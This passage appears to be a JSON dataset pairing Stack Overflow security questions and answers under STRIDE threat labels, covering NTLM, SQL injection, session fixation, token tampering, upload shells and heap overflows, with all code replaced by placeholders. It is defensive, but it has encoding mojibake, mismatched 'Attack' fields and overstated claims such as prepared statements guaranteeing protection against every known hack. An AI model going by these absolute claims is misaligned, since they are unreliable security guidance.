Error    The fix for this error is to select the Negotiate package in place of NTLM. How this is done will depend on the particular Network subsystem being used by the client or server. Some examples are given below. You should consult the documentation on the particular library or API set that you are using. ",
    "Mitigation": "   <h2>Why the NTLM Plug-in is Needed</h2>    NTLM is an outdated authentication protocol with flaws that  potentially compromise the security of applications and the operating  system. The most important shortcoming is the lack of server  authentication, which could allow an attacker to trick users into  connecting to a spoofed server. As a corollary of missing server  authentication, applications using NTLM can also be vulnerable to a  type of attack known as a \u9225\u6e1eeflection\u9225?attack. This latter allows an  attacker to hijack a user\u9225\u6a9a authentication conversation to a  legitimate server and use it to authenticate the attacker to the  user\u9225\u6a9a computer. NTLM\u9225\u6a9a vulnerabilities and ways of exploiting them  are the target of increasing research activity in the security  community.    Although Kerberos has been available for many years many applications  are still written to use NTLM only. This needlessly reduces the  security of applications. Kerberos cannot however replace NTLM in all  scenarios \u9225?principally those where a client needs to authenticate to  systems that are not joined to a domain (a home network perhaps being  the most common of these). The Negotiate security package allows a  backwards-compatible compromise that uses Kerberos whenever possible  and only reverts to NTLM when there is no other option. Switching code  to use Negotiate instead of NTLM will significantly increase the  security for our customers while introducing few or no application  compatibilities. Negotiate by itself is not a silver bullet \u9225?there  are cases where an attacker can force downgrade to NTLM but these are  significantly more difficult to exploit. However, one immediate  improvement is that applications written to use Negotiate correctly  are automatically immune to NTLM reflection attacks.    By way of a final word of caution against use of NTLM: in future  versions of Windows it will be possible to disable the use of NTLM at  the operating system. If applications have a hard dependency on NTLM  they will simply fail to authenticate when NTLM is disabled.    <h2>How the Plug-in Works</h2>    The Verifier plug detects the following errors:      The NTLM package is directly specified in the call to AcquireCredentialsHandle (or higher level wrapper API).  The target name in the call to InitializeSecurityContext is NULL.  The target name in the call to InitializeSecurityContext is not a properly-formed SPN, UPN or NetBIOS-style domain name.      The latter two cases will force Negotiate to fall back to NTLM either directly (the first case) or indirectly (the domain controller will return a \u9225\u6e1brincipal not found\u9225?error in the second case causing Negotiate to fall back).    The plug-in also logs warnings when it detects downgrades to NTLM; for example, when an SPN is not found by the Domain Controller. These are only logged as warnings since they are often legitimate cases \u9225?for example, when authenticating to a system that is not domain-joined.    <h2>NTLM Stops</h2>    5000 \u9225?Application Has Explicitly Selected NTLM Package    Severity \u9225?Error    The application or subsystem explicitly selects NTLM instead of Negotiate in the call to AcquireCredentialsHandle. Even though it may be possible for the client and server to authenticate using Kerberos this is prevented by the explicit selection of NTLM.    How to Fix this Error    The fix for this error is to select the Negotiate package in place of NTLM. How this is done will depend on the particular Network subsystem being used by the client or server. Some examples are given below. You should consult the documentation on the particular library or API set that you are using.  <h2>Short Answer</h2>The TargetName is the username that the &quot;server&quot; code will be running as.I'm logged in as [CODE]I want to prove my identity to [CODE]Set TargetName to [CODE]<h2>Background</h2>The [CODE] authentication package will attempt to use [CODE]. If it cannot, it will attempt to fallback to [CODE].You don't want to use NTLM; it is old, deprecated, weak, broken, and should not be used.You want to use [CODE].In order to use [CODE] you must supply a TargetNameWithout a TargetName, [CODE] is fundamentally unable the functionThe question becomes, given all the parties involved:me (Ian)authenticating with Stevewhat TargetName do i specify?[LINK]This is where it's important to know what TargetName means to Kerberos:i want to prove my identity to [CODE]the domain controller hands me an encrypted blob that proves my identitythe blob is encrytped so [CODE] is the only one able to decrypt itthe domain controller knows to encrypt it for [CODE] because i specified [CODE] in the TargetNameSteve is the targetThat's how Steve knows the blob is valid, it was encrypted so only he can decrypt it.I have to tell Kerberos who i will be giving the encrypted blob to, so the domain controller knows who to encrypt it for.So in the above list of possible names, three values work:[LINK][CODE]So you can see why my earlier attempts to call InitializeSecurityContext all failed:[CODE]Because i wasn't specifying Steve as the TargetName; i was specifying something non-sensical:[CODE]In fairness, [LINK] did [LINK] to pass [CODE].<h1>Extra confusion because flexibility (welcome to SPN)</h1><h2>SPNs Short version</h2>when using Kerberos you must specify a username as your TargetNamean SPN is an &quot;alias&quot; for a usernametherefore you can specify an SPN as your TargetName<h2>SPNs Long Version</h2>In the case above i had to know that the &quot;server&quot; code will be running as [CODE].That's a pain. I mean it's fine when i know it's steve. But if i'm talking to a remote machine, i have to find out the user account that the code is running as?i have to figure out that IIS is running as [CODE]?i have to figure out that SQL Server is running as [CODE]?and what if the service is running as Local Service; that isn't a domain user at all?Fortunately(?), Kerberos created aliases (called Service Principle Names - or SPNs):if i need to authenticate to the web server [CODE]and IIS service is running under the domain account [CODE]rather than have to specify the targetname of [CODE]i can specify [CODE]that's because IIS registered an alias with the domain controller[CODE] \u922b?[CODE]All this requires that you know the SPN if you wish to use it as a TargetName. Various standard Microsoft products register SPNs when they install:IIS: [CODE]SQL Server: [CODE]SMTP: [CODE]File sharing: [CODE]These are all undocumented, and make your life hell when one isn't configured correctly.But by no means do you have to supply a SPN. An SPN is simply an alias designed to make your life easier more difficult.It's roughly equivalent to attempting to specify &quot;stackoverflow.com&quot;, rather than simply using &quot;35.186.238.101&quot;.<h1>Bonus Chatter - How does SSPI work?</h1>SSPI was designed as a generic wrapper around different security algorithms. The way to use the API is pretty simple:Client: calls [CODE] and is given a blobclient sends that blob to the serverServer: calls [CODE], and is given a blob backserver sends that blob back to the clientClient: calls [CODE], and is given back a blobclient sends that blob back to the serverServer: calls [CODE], and is given a blob back...keep repeating until told to stop...Both sides keep going back and forth until the function stops returning  a blob that needs to be sent to the other side:[LINK]And so the with SSPI you do this ping-ponging back and forth until you're told to stop. And so they were able to shoe-horn every authentication scheme into that ping-pong-until-told-to-stop high level abstraction.<h2>How do I transmit the blobs?</h2>You transmit the blobs over whatever communication channel you're using.If you're talking to a remote server over TCP/IP, then you'd probably use that:[CODE]If you're doing it over http:[CODE]The SSPI API doesn't care you to get the blob transmitted back and forth - just that you have to transmit it back and forth.using connecting to SQL Server, SQL client driver does the transmitting over the database connectionusing http, the browser sends the blobs in request and response headerYou can even use a carrier pidgeon, Skype, or E-mail if you like. "
  },
  {
    "Threat": "T",
    "Attack": " When you execute a SQL query, you have to clean your strings or users can execute malicious SQL on your website. ",
    "Mitigation": " For maximum security, performance, and correctness use prepared statements.Here's how to do this with lots of examples in different languages, including PHP:  [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " The concern is if the app is targeted by hackers they could add malicious code and upload to an alternate app store and dupe users in to downloading it.  ",
    "Mitigation": " I ended up using [LINK] (paid obfuscator for Android). It offers a module that preforms apk verification. It is simple to implement and offers better than average protection.   Here's the code to do the check:  [CODE]  The main issue is where to store the checksum of the apk to verify against given that it could to be replaced. The dexguard way is to check it locally but using other features like class/string encryption and api hiding obscure this call.  "
  },
  {
    "Threat": "S",
    "Attack": " If another application has access to your cookies, then they can impersonate you on the website anyway, so access to the api is no different.All authentication methods still go through our control.Regular expiry of tokens means that if they are compromised then there is a limited time for exploitation. ",
    "Mitigation": " OAuth is only supported on browsers that have LocalStorageThe login form will check LocalStorage for OAuth keys and try an OAuth login automatically if OAuth keys exist.There is a checkbox for \"remember me\" on login form, so a user can have OAuth tokens created for them on login.A successful login w/ remember me will:find or create ClientApplication with the name equal to User Agent, and create the tokens if necessaryrespond with a javascript tag in the HTML response.  The javascript tag will call a javascript function with the tokens passed as arguments.  This function will save the OAuth tokens to LocalStorage.An unsuccessful OAuth login attempt will:respond with a javascript tag in the HTML response.  The javascript tag will call a javascript function to clear the LocalStorage settings for OAuth tokens.  This will prevent additional OAuth login attempts "
  },
  {
    "Threat": "S",
    "Attack": " Since this is a public facing service I am however concerned that someone could register with the service, login and then modifying the token that they receive to access the accounts of other users. ",
    "Mitigation": " You are really over-thinking the token.  Truthfully, the best token security relies on randomness, or more accurately unpredictability.  The best tokens are completely random.  You are right that a concern is that a user will modify his/her token and use it to access the accounts of others.  This is a common attack known as \"session stealing.\"  This attack is nearly impossible when the tokens are randomly generated and expired on the server side.  Using the user's information such as IP and/or a time stamp is bad practice because it improves predictability.  I did an attack in college that successfully guessed active tokens that were based on server time stamps in microseconds.  The author of the application thought microseconds would change fast enough that they'd be unpredictable, but that was not the case.  You should be aware that when users are behind proxy servers, the proxy will sometimes view their SSL requests in plain text (for security reasons, many proxies will perform deep packet inspection).  For this reason it is good that you expire the sessions.  If you didn't your users would be vulnerable to an attack such as this, and also possible XSS and CSRF.  RSA or Rijndael should be plenty sufficient, provided a reasonable key length.  Also, you should use an HMAC with the token to prevent tampering, even if you're signing it.  In theory it would be redundant, since you're signing with a private key.  However, HMAC is very well tested, and your implementation of the signing mechanism could be flawed.  For that reason it is better to use HMAC.  You'd be surprised how many \"roll your own\" security implementations have flaws that lead them to compromise.  It is considered safe to include timestamps/user IDs in the token as long as they are encrypted with a strong symmetric secret key (like AES, Blowfish, etc) that only the server has and as long as the token includes a tamper-proof hash with it such as HMAC, which is encrypted with the secret key along with the user ID/timestamp.  The hash guarantees integrity, and the encryption guarantees confidentiality.    If you don't include the HMAC (or other hash) in the encryption, then it is possible for users to tamper with the encrypted token and have it decrypt to something valid.  I did an attack on a server in which the User ID and time stamp were encrypted and used as a token without a hash.  By changing one random character in the string, I was able to change my user ID from something like 58762 to 58531.  While I couldn't pick the \"new\" user ID, I was able to access someone else's account (this was in academia, as part of a course).   An alternative to this is to use a completely random token value, and map it on the server side to the stored User ID/time stamp (which stays on the server side and is thus outside of the clients control).  This takes a little more memory and processing power, but is more secure.  This is a decision you'll have to make on a case by case basis.  As for reusing/deriving keys from the IV and other keys, this is usually ok, provided that the keys are only valid for a short period of time.  Mathematically it is unlikely someone can break them.  It is possible however.  If you want to go the paranoid route (which I usually do), generate all new keys randomly.  "
  },
  {
    "Threat": "D",
    "Attack": " It is an example and my real code send much more data to server, and maybe code above doesn't work, I just make my question more exact and specific as stackoverflow want me.my question is how to make these transactions safe and secure from hackers which may debug my code and find my url , in code above (params[0]) and send amount of data to my site and make it down. or how can I use the service of sending data to server more secure from these kind of dangers?? ",
    "Mitigation": " After this time pass I come with some answers with my own question. these tips are for php server side of android app client, but the logic can use in other languages of server side.  [CODE] "
  },
  {
    "Threat": "I",
    "Attack": " I did some experiments and it appears that any data written to PasswordVault from one desktop app (not a native UWP app) can be read from any other desktop app. Even packaging my desktop app with [LINK] technology and thus having a Package Identity does not fix this vulnerability. ",
    "Mitigation": ""
  },
  {
    "Threat": "T",
    "Attack": " SQL injection: Yes! Mysql_Escape_String probably STILL keeps you susceptible to SQL injections, depending on where you use PHP variables in your queries.    LIKE exploits:  LIKE \"$data%\" where $data could be \"%\" which would return ALL records ... which can very well be a security exploit... just imagine a Lookup by last four digits of a credit card... OOPs! Now the hackers can potentially receive every credit card number in your system! (BTW: Storing full credit cards is hardly ever recommended!)Charset Exploits:  No matter what the haters say, Internet Explorer is still, in 2011, vulnerable to Character Set Exploits, and that's if you have designed your HTML page correctly, with the equivalent of [CODE]!  These attacks are VERY nasty as they give the hacker as much control as straight SQL injections: e.g. full.   ",
    "Mitigation": " The proper, and only (really) , defense is a PROACTIVE one:  Use Prepared Statements.  Prepared statements are designed with special care so that ONLY valid and PROGRAMMED SQL is executed.  This means that, when done correctly, the odds of unexpected SQL being able to be executed are drammatically reduced.  Theoretically, prepared statements that are implemented perfectly would be impervious to ALL attacks, known and unknown, as they are a SERVER SIDE technique, handled by the DATABASE SERVERS THEMSELVES and the libraries that interface with the programming language.  Therefore, you're ALWAYS guaranteed to be protected against EVERY KNOWN HACK, at the bare minimum.  And it's less code:  [CODE]    Using prepared statements allows one to harness the protective measures of  the SQL server itself, and therefore  you are protected from things that the  SQL server people know about. Because  of this extra level of protection, you  are far safer than by just using  escaping, no matter how thorough. "
  },
  {
    "Threat": "T",
    "Attack": " Ignoring for the moment the superior alternative of parameterized queries, is a webapp that uses addslashes() exclusively still vulnerable to SQL injection, and if yes, how?  Addslashes is generally not good enough when dealing with multibyte encoded strings.So we need a DB-specific functions like mysql_real_escape_string() ",
    "Mitigation": " Addslashes is generally not good enough when dealing with multibyte encoded strings.So we need a DB-specific functions like mysql_real_escape_string() "
  },
  {
    "Threat": "I",
    "Attack": " I manage a secured PHP/MySQL web app with extensive jQuery use. Today, a strange error popped up in our app's logs:[CODE]  The user's user agent string is:[CODE] ",
    "Mitigation": " Disclaimer: I'm not a security analyst/expert, your issue simply sparked my interest ;)  Warning: While I share the initial conclusion that the code itself is probably harmless, the underlying technology can most certainly be (ab)used for malicious intents as well, so please take care when investigating this yourself.  <h1>Analysis</h1>  You already found the relevant evidence yourself - searching further I found another [LINK], which is more readable, so I'm using this for the explanation (though at first sight the other one would allow this as well after formatting).  The snippet features JavaScript fragments with the following major functionality:  Line 13 initializes the variable [CODE] with all sorts of items for later use, e.g. various constants`, helper functions, browser compatibility stuff and actual payloads, for example:  Line20 defines an empty [CODE], line 21 defines a [CODE], which happens to be the one in question (d15gt9gwxw5wu0.cloudfront.net)line 261 defines a function [CODE] which in turn uses [CODE]from line 266, further accompanied by [CODE] on line 277 - their respective intend is obviousline 270 defines function [CODE], which seems to be the one generating the URL you have found in your logs - see appendix below for the code snippet  Deduction: Even without further evidence gathered below, the naming and functionality strongly hints on [CODE] being a JavaScript file serving custom JavaScript specifically assembled/generated for the domain at hand<br/><br/>line 100 defines a function [CODE], which references some kind of an ad server indeed (ads2srv.com) - see appendix below for the code snippetline 368 finally defines a function [CODE], which provides the most definite clues regarding the likely origin of all this, namely the notion of some Yontoo Client and Yontoo API - see appendix below for the code snippet  <h2>Corollary</h2>  <h3>What's it all about?</h3>  The extracted clues Yontoo Client and Yontoo API easily lead to [LINK], an Application Platform that allows you to control the websites you visit everyday, i.e. it sounds like a commercialized version of [LINK], see [LINK]:    Yontoo is a browser add-on that customizes and  enhances the underlying website    Where Can I Use It?    Yontoo works on any site on the Web, although the  functionality comes from separate applications called Yontoo Apps  which provide specific functionalities depending on what site you are  on.      [emphasis mine]  Now, looking at the current listings in their [LINK] easily demonstrates, why this might be used for questionable nontransparent advertizing as well for example, all the trust signs and seals in their footer notwithstanding.  <h3>How did it end up in your logs?</h3>  Another quote provides more insight into the functionality and how it might have yielded the issue you've encountered:    Yontoo [...] is a  browser add- on that creates virtual layers that can be edited to  create the appearance of having made changes to the underlying  website. [...]  If you see a need for an application or tool over a website, then you  are free to create!  So somebody apparently has visited your site and created some custom domain rules for it by means of the Yontoo client (if it actually allows this for end users) or one of the [LINK] (the snippet used for analysis references the Drop Down Deals app in line 379 for example), which  triggered the creation of [CODE] to store these rules for reuse on next site visit in turn.  Due to some security flaw somewhere (see conclusion below) this URL or a respective JavaScript snippet must have been injected into JavaScript code of your application (e.g. by means of [LINK] indeed), and triggered the log entry error at some point in turn.  <h2>Conclusion</h2>  As mentioned upfront already, I share the initial conclusion that the code itself is probably harmless, although the underlying technology can most certainly be (ab)used for malicious intents as well due to its very nature of mocking with client side JavaScript, i.e. a user allows code from a 3rd party service to interact with sites (and especially data) he uses and trusts every day - your case is the apparent evidence for something gone wrong already in this regard.  I haven't investigated the security architecture (if any) of Yontoo, but wasn't able to find any information regarding this important topic immediately on their website either (e.g. in their [LINK] section), which is pretty much unacceptable for a technology like this IMHO, all the trust signs and seals in their footer notwithstanding.  On the other hand, users do install 3rd party scripts from e.g. [LINK] all the time of course, not the least for [LINK] as well ;)  Please make your own judgment accordingly!    <h1>Appendix</h1>  Below you can find the code snippets referenced in the analysis (I've been unable to inline them within the lists without breaking the layout or syntax highlighting):  loadDomainRules()  [CODE]  loadGeo()  [CODE]  i()  [CODE] "
  },
  {
    "Threat": "T",
    "Attack": " I am working on my first desktop app that queries LDAP. I'm working in C under unix and using opends, and I'm new to LDAP. After woking a while on that I noticed that the user could be able to alter the LDAP query by injecting malicious code.I'd like to know which sanitizing techniques are known, not only for C/unix development but in more general terms, i.e., web development etc.I thought that escaping equals and semicolons would be enough, but not sure. ",
    "Mitigation": " OWASP is a good security guide that I use a lot, and has example code (in Java, but you should be able to translate):  [LINK]  Also, here's an Active Directory specific reference:  [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " I am in a situation where I inherited a rather large web application that has some SQL Injection vulnerabilities.  I have found several just by looking through the code for other issues, but I'm wondering if a safe way to find all SQL Injection vulnerabilities would be to search all files for instances of [CODE] and then check to see if they are parametrized queries.  Is this a solid plan? ",
    "Mitigation": " I wouldn't look just for SqlCommand specifically - the code could use DBCommand or IDbCommand. It could be wrapped in ORMs like EF, L2S or NHibernate (all offer some level of raw access). It could use something like \"dapper\" or simple.data. Or DataTable / DataAdapter. You might have code that uses legacy OLEDB or ADODB access. Heck, for all we know you could have written your own low-level TDS API.  So: it comes down to checking data access code, which could take many forms. If your departmental approach is \"use SqlCommand directly\", then that changes things.  Also: SQL injection isn't limited to .NET - you can, for example, create a SQL injection risk in a raw command text or stored procedure even if you parameterise, if the TSQL does any kind of concatenation to make dynamic SQL, to be invoked via EXEC. Note that sp_executesql can help with that. "
  },
  {
    "Threat": "I",
    "Attack": " I'm wondering how to prevent Session fixation attacks in ASP.NET (see [LINK]) ",
    "Mitigation": " Have been doing more digging on this. The best way to prevent session fixation attacks in any web application is to issue a new session identifier when a user logs in.  In ASP.NET Session.Abandon() is not sufficient for this task. Microsoft state in [LINK] that: \"\"When you abandon a session, the session ID cookie is not removed from the browser of the user. Therefore, as soon as the session has been abandoned, any new requests to the same application will use the same session ID but will have a new session state instance.\"\"  A bug fix has been requested for this at [LINK]  There is a workaround to ensure new session ids' are generated detailed at [LINK] this involves calling Session.Abandon and then clearing the session id cookie.  Would be better if ASP.NET didn't rely on developers to do this. "
  },
  {
    "Threat": "E",
    "Attack": " I don't want them to clear the whole database by inserting a DELETE statement.My ideas would be: ",
    "Mitigation": " Create a tool that will create the query for the user on the background. Simply by clicking buttons and entering table names. This way you can catch all weird behavior in the background bringing you out of danger for queries you don't want executed.  Create a MySQL user that is only allowed to do [CODE] queries. I believe you can even decide what tables that user is allowed to select from. Use that user to execute the queries the user enters. Create a seperate user that has the permissions you want it to to do your [CODE], [CODE] and [CODE] queries.  Before the query is executed, make sure there is nothing harmfull in it. Scan the query for bad syntax.  Example:  [CODE]  Note: You could add some PHP code to filter out comments before doing this check  What you are looking to do is quite possible however you'll never have a 100 percent guarantee that it's safe. Instead of letting the users make the queries it's better to use an API to provide data to your users. "
  },
  {
    "Threat": "D",
    "Attack": " Is password_verify() (and other functions of the same function set) vulnerable against DoS via maxed out POST parameters ? Please also consider site-wide config situations of POST upload sizes much larger than 4MB. ",
    "Mitigation": " The password is limited to 72 characters internally in the crypt algorithm.   To see why, let's look at [CODE]'s source: [LINK]  [CODE]  The [CODE] field is a simple [CODE] field. So there's no length information. All that's passed is a normal pointer.  So if we follow that through, we'll eventually land at [LINK].  The important part is the loop:  [CODE]  [CODE] is defined to be 16. So the outer loop will loop 18 times ([CODE]).  The inner loop will loop 4 times. 4 * 18 == 72.  And there you have it, only 72 characters of the key will be read. No more.  <h2>Note</h2>  Now, there's an interesting side-effect to that algorithm. Because it uses C-Strings (strings terminated by a [CODE] null byte), it's impossible for it to use anything past [CODE]. So a password that contains a null-byte will lose any entropy past it. Example: [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " What I'd like to do is to simply disallow execution of any scripts (php, perl, cgi scripts, whatever I may install in the future) in the upload folder. [LINK] suggests adding the following line in a [CODE] file in that folder: ",
    "Mitigation": " Put this in your [CODE]:  [CODE]  But this has a few security holes: one can upload a .htaccess in a subdirectory, and override these settings, and they might also overwrite the .htaccess file itself!  If you're paranoid that the behaviour of the option should change in the future, put this in your [CODE]  [CODE]  If you can't modify the apache configuration, then put the files in a [CODE] with the following directory structure:  [CODE]  That way, nobody should be able to overwrite your [CODE] file since their uploads go in a subdirectory of [CODE], not in [CODE] itself.  AFAICT, you should be pretty safe with that. "
  },
  {
    "Threat": "T",
    "Attack": " For the sake of getting something up and running right now I am passing the Express query string object directly to a mongoose find function. What I am curious about is how dangerous would this practice be in a live app. I know that a RDBMS would be extremely vulnerable to SQL injection. Aside from the good advice of \"sanitize your inputs\" how evil is this code: ",
    "Mitigation": " As far as injection being problem, like with SQL, the risk is significantly lower... albeit theoretically possible via an unknown attack vector.  The data structures and protocol are binary and API driven rather than leveraging escaped values within a domain-specific-language. Basically, you can't just trick the parser into adding a \";db.dropCollection()\" at the end.  If it's only used for queries, it's probably fine... but I'd still caution you to use a tiny bit of validation:  Ensure only alphanumeric characters (filter or invalidate nulls and anything else you wouldn't normally accept)Enforce a max length (like 255 characters) per termEnforce a max length of the entire queryStrip special parameter names starting with \"$\", like \"$where\" &amp; suchDon't allow nested arrays/documents/hashes... only strings &amp; ints  Also, keep in mind, an empty query returns everything. You might want a limit on that return value. :) "
  },
  {
    "Threat": "T",
    "Attack": " [CODE]  [CODE]  Essentially, you want to put the parameters in the cursor command, because it will make sure to make the data database safe. With your first command, it would be relatively easy to make a special [CODE] or [CODE] that put something into your SQL code that wasn't safe. See the [LINK], and the referenced [LINK] . Specifically, the python pages quote:  [CODE] ",
    "Mitigation": " Yes, it is. Use something like this to prevent it:  [CODE]  Note that you cannot enter the table in like this. Ideally the table should be hard coded, in no circumstance should it come from a user input of any kind. You can use a string similar to what you did for the table, but you'd better make 100% certain that a user can't change it somehow... See [LINK] for more details.   Essentially, you want to put the parameters in the cursor command, because it will make sure to make the data database safe. With your first command, it would be relatively easy to make a special [CODE] or [CODE] that put something into your SQL code that wasn't safe. See the [LINK], and the referenced [LINK] . Specifically, the python pages quote:    Usually your SQL operations will need to use values from Python  variables. You shouldn\u9225\u6a9b assemble your query using Python\u9225\u6a9a string  operations because doing so is insecure; it makes your program  vulnerable to an SQL injection attack (see [LINK] for  humorous example of what can go wrong).    Instead, use the DB-API\u9225\u6a9a parameter substitution. Put ? as a  placeholder wherever you want to use a value, and then provide a tuple  of values as the second argument to the cursor\u9225\u6a9a execute() method.  (Other database modules may use a different placeholder, such as %s or  :1.)  Basically, someone could set an args that executed another command, something like this:  [CODE]  Using cursor.execute will stuff the value given, so that the argument could be as listed, and when you do a query on it, that is exactly what you will get out. [LINK] explains this humorously as well.   "
  },
  {
    "Threat": "T",
    "Attack": " How is one able to execute arbitrary code simply by causing [LINK] or [LINK] overflows? ",
    "Mitigation": " This is the most widely known document on the subject: [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " How are heap overflow attacks executed?In the case of stack overflow attacks, the attacker replaces the function return address with his address of choice.How is this done in the case of a heap overflow attack? Also, is it possible to run code from the heap?  This article has a nice overview on heap overflow attacks:[LINK] ",
    "Mitigation": " This article describes some of the hardening that went into Vista's heap manager to prevent this sort of attack:[LINK] "
  },
  {
    "Threat": "I",
    "Attack": " What's the best way to prevent a dictionary attack? ",
    "Mitigation": " I like gmail's anti-brute force system a lot.  It is based on \"heat\" that a user can accumulate, after the user has overheated they are prompted with a captcha.   You can keep track of heat using a sql database, or using [LINK].  Heat is assigned to an ip address.  It is 100% impossible to \"spoof\" a tcp connection over the internet because of the [LINK],  however proxy servers are plentiful and ip address are very cheap.  Proxy servers are commonly used to send spam,  you can check a [LINK] and automatically prompt them for a captcha.  Each bad action against your system will update the heat table.   For instance a failed login will accumulate 35% heat.  Once the heat level is greater than or equal to 100% then the user is forced to solve a captcha.  Solving a captcha will \"cool down\"  that ip address.  The heat table could contain a timestamp column that is set to the current time on update.   After 24 hours or so the heat can return to 0.   [LINK] is the most secure captcha you can use.   "
  },
  {
    "Threat": "T",
    "Attack": " But yesterday, there was some malicious code at the end, suddenly. The output of my index.php was:[CODE]  I opened the file on my webspace (downloaded via FTP) and I saw that someone had put this code right into the file! ",
    "Mitigation": " I don't think that the problem is that you are using a shared host because I have found six others ([LINK], [LINK], [LINK], [LINK], [LINK], and [LINK]) whose websites had the same script added. Also, it is doubtful that any of your files would be writable by others because files that are uploaded over FTP are subject to the file creation mode bits mask.  My best guess is that someone is cracking websites using either known exploits or exploits against common weaknesses, and that this person is identifying likely targets with [LINK]. degmsb's Wordpress website and Benvolio's Burning Board Lite website were likely cracked via known exploits (possibly known exploits of plugins to these software bases such as TinyMCE), and your website, since you wrote it yourself, was likely cracked via an exploit against a common website weakness.  Given that you allow file uploads (one of your PHP scripts accepts &amp; saves files that are uploaded by your users), I would consider [LINK]. A CWE-434 exploit works like this: suppose you allow users to upload avatar images or pictures. The script to which uploaded images are POSTed might save the file to [CODE] using the same filename that the user supplied. Now imagine that someone uploads [CODE] (or [CODE], [CODE], etc.). Your script will dutifully save this upload to [CODE] and all that the cracker needs to do to have the server run this script is browse to [CODE]. Even if the file is named [CODE], some web servers will execute the file.  Another possibility is that the filename of the upload that PHP receives, [CODE], which is the [CODE] value in the [CODE] header that is sent, was constructed to something like [CODE]. If your script saved the newly-uploaded file to [CODE], or [CODE] on a non-Windows host ([LINK]), and there was some way for the user to cause one of your PHP scripts to [CODE] or [CODE] any script in the [CODE] directory (say [CODE]), then the cracker would be able to execute arbitrary PHP. "
  },
  {
    "Threat": "T",
    "Attack": " Someone (probably a bot) sent a request with the following URL to my ASP.NET 4.0 web forms application (running on IIS 7.0):[CODE]  This caused an [CODE]. I received a logging email from ASP.NET HealthMonitoring I had configured, telling me:  [CODE]  I've tested that a colon in a query string (like [CODE]) does not cause this exception.  On NTFS, a given filepath can have multiple associated data streams. Apart from the main stream, also known as [CODE], there can be others, typically used to store metadata like the Internet Zone marker in downloaded files.  [LINK] are accessed using a colon separator, eg. [CODE] is an alternative way of saying [CODE]. The presense of ADSs through the web has caused Microsoft some security issues in the past (eg. returning the source code of ASP pages instead of executing them), so as a precaution they're blocking the use of colon in the path part of the URL, as the path part often maps to the filesystem (though not in your case). This is less likely to occur from the query string so is not blocked there.  There are other characters that even if you turn Request Validation off you can't put in a path part for routing purposes. In particular, slashes ([CODE], [CODE], and byte sequences that would be invalid overlong UTF-8 sequences resolving to the same) and the zero byte. It's best to be conservative about what you put in paths in general. ",
    "Mitigation": " On NTFS, a given filepath can have multiple associated data streams. Apart from the main stream, also known as [CODE], there can be others, typically used to store metadata like the Internet Zone marker in downloaded files.  [LINK] are accessed using a colon separator, eg. [CODE] is an alternative way of saying [CODE]. The presense of ADSs through the web has caused Microsoft some security issues in the past (eg. returning the source code of ASP pages instead of executing them), so as a precaution they're blocking the use of colon in the path part of the URL, as the path part often maps to the filesystem (though not in your case). This is less likely to occur from the query string so is not blocked there.  This is far from the worst false positive Request Validation will generate. Its anti-injection features are much worse. I personally would always disable it, as it's a stupid broken feature that can never actually make your webapp secure; only proper attention to string-escaping (and heavy sanitisation of anything you plan to use as a filename) can do that.  There are other characters that even if you turn Request Validation off you can't put in a path part for routing purposes. In particular, slashes ([CODE], [CODE], and byte sequences that would be invalid overlong UTF-8 sequences resolving to the same) and the zero byte. It's best to be conservative about what you put in paths in general. "
  },
  {
    "Threat": "T",
    "Attack": " [CODE]  [CODE]  Because angle brackets [CODE] are [LINK] they seem to get automatically encoded by the browser on the way in, before they can get anywhere near the JS runtime.  This leads me to believe that simply rendering the querystring directly on the client using [CODE] is always safe, and not a possible XSS vector. (I realize that there are many other ways in which an app can be vulnerable of course, but let's stick to the precise case described here.)  Not relevant to the question, but an interesting aside. If I decode the URI first then browser behavior is different: [CODE]. The [LINK] in both Chrome and Safari blocks the page, while Firefox shows the alert.  If I use Query String [CODE] on IE6 on Windows XP I get the injected code show the alert, this happens also using [CODE] or [CODE] in the page, so I would say your second assumption is right if [LINK] is still a reasonable browser: it is a feature of modern browsers ",
    "Mitigation": " If I use Query String [CODE] on IE6 on Windows XP I get the injected code show the alert, this happens also using [CODE] or [CODE] in the page, so I would say your second assumption is right if [LINK] is still a reasonable browser: it is a feature of modern browsers "
  },
  {
    "Threat": "T",
    "Attack": "   From [LINK] magazine:    ...the Palin hack didn't require any  real skill. Instead, the hacker simply  reset Palin's password using her  birthdate, ZIP code and information  about where she met her spouse -- the  security question on her Yahoo  account, which was answered (Wasilla  High) by a simple Google search. ",
    "Mitigation": " Out-of-band communication is the way to go.  For instance, sending a temporary password in SMS may be acceptable (depending on the system). I've seen this implemented often by telecoms, where SMS is cheap/free/part of business, and the user's cellphone number is pre-registered...  Banks often require a phone call to/from a specific number, but I personally am not too crazy about that....  And of course, depending on the system, forcing the user to come in to the branch office to personally identify themselves can also work (just royally annoy the user).  Bottom line, DON'T create a weaker channel to bypass the strong password requirements.  "
  },
  {
    "Threat": "T",
    "Attack": " But what if a malicious script will first make some simple GET request (by [LINK]) in order to download the page containing the antiforgery token in a hidden input field, extracts it, and use it to make a valid [LINK]?  ",
    "Mitigation": " Yes, this is all you need to do.  As long as you generate a new token on each protected page, with [CODE]and always ensure it is checked in any protected action, using [CODE]  This implements the Synchronizer Token Pattern as discussed at the [LINK] at OWASP.  In order for a script to succeed in making an acceptable request, it would have to first get the form and read the token and then post the token. [LINK] will stop this from being allowed in a browser. A site canot make an AJAX style http request to another site; only to itself. If for some reason same origin policy can be breached, then you will become vulnerable.  Note that if you have a cross-site scripting vulnerability, then an attacker can abuse the xss vulnerability to circumvent the protection provided by the same origin policy (because the script is now running from your own site, so SOP succeeds).   Another thing to watch out for is Flash and Silverlight. Both of these technologies do not subscribe to the same origin policy and instead use cross domain policy files to restrict access to remote resources. Flash/Silverlight script can only access resources on your site if you publish a cross domain policy xml file on your own site. If you do publish this file, only ever allow a whitelist of trusted third-party servers and never allow *.  Read more about [LINK]See also: [LINK] "
  },
  {
    "Threat": "I",
    "Attack": " Can't this be spoofed? I am not sure if the SetPublicKey() method has any effect on a built assembly, but even the MSDN documentation shows how you can use this on a dynamically generated assembly (reflection emit) so that would mean you could extract the public key from the host application and inject it into an assembly of your own and run mallicious code if the above was the safe-guard, or am I missing something? ",
    "Mitigation": " There is no managed way to check the signature of an assembly and checking the public key leaves you vulnerable to spoofing. You will have to use [LINK] and call the StrongNameSignatureVerificationEx function to check the signature  [CODE] "
  },
  {
    "Threat": "S",
